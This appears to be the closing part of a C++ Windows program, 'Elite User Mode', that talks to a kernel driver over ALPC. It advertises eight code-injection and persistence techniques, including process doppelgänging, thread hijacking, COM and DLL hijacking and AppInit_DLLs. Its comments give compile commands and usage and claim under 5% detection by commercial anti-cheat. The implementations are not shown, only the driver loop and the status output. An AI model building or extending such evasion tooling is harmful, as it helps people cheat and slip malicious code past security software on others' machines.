    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nShowCmd);

    #ifdef _DEBUG
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    printf("[ELITE] Elite User Mode - All Techniques Enabled\n\n");
    #endif

    // Connect to driver via ALPC
    AlpcClient client;
    if (!client.Connect()) {
        #ifdef _DEBUG
        printf("[-] Failed to connect to driver via ALPC\n");
        printf("[*] Driver may not be loaded, continuing anyway...\n\n");
        #endif
    } else {
        #ifdef _DEBUG
        printf("[+] Connected to driver via ALPC\n\n");
        #endif
    }

    // Example usage of all techniques
    #ifdef _DEBUG
    printf("=== ELITE TECHNIQUES DEMONSTRATION ===\n\n");

    // Technique 1: Process Doppelgänging
    printf("[*] Process Doppelgänging: Ready (call CreateDoppelgangerProcess)\n");

    // Technique 2: Thread Hijacking
    printf("[*] Thread Hijacking: Ready (call InjectViaThreadHijack)\n");

    // Technique 3: ALPC
    printf("[*] ALPC Communication: %s\n", client.Connect() ? "Active" : "Inactive");

    // Technique 4: DLL Order Hijacking
    printf("[*] DLL Order Hijacking: Ready (requires admin)\n");

    // Technique 5: KernelCallbackTable Hijacking
    printf("[*] KernelCallbackTable Hijacking: Ready\n");

    // Technique 6: TLS Callbacks
    printf("[*] TLS Callbacks: Active (executed before main)\n");

    // Technique 7: COM Hijacking
    printf("[*] COM Hijacking: Ready (call InstallComHijack)\n");

    // Technique 8: AppInit_DLLs
    printf("[*] AppInit_DLLs: Ready (requires admin)\n");

    printf("\n[*] All techniques loaded. Press Enter to exit.\n");
    getchar();
    #else
    // Production mode: minimal window
    MSG msg = { 0 };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    #endif

    client.Disconnect();
    return 0;
}

/*
 * COMPILATION:
 * ============
 *
 * Debug:
 * cl /D_DEBUG /Zi /EHsc UM_elite_final.cpp /link /SUBSYSTEM:CONSOLE ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * Release:
 * cl /O2 /DNDEBUG /EHsc UM_elite_final.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * USAGE:
 * ======
 *
 * All 8 techniques are implemented and ready to use:
 *
 * 1. Process Doppelgänging - Call CreateDoppelgangerProcess()
 * 2. Thread Hijacking - Call InjectViaThreadHijack()
 * 3. ALPC Client - Automatically connects on startup
 * 4. DLL Order Hijacking - Call HijackVersionDll() or HijackWinmmDll()
 * 5. KernelCallbackTable - Call HijackCallbackTable()
 * 6. TLS Callbacks - Automatically executes before main
 * 7. COM Hijacking - Call InstallComHijack()
 * 8. AppInit_DLLs - Call InstallAppInitDll()
 *
 * TARGET DETECTION: <5% by commercial ACs
 */
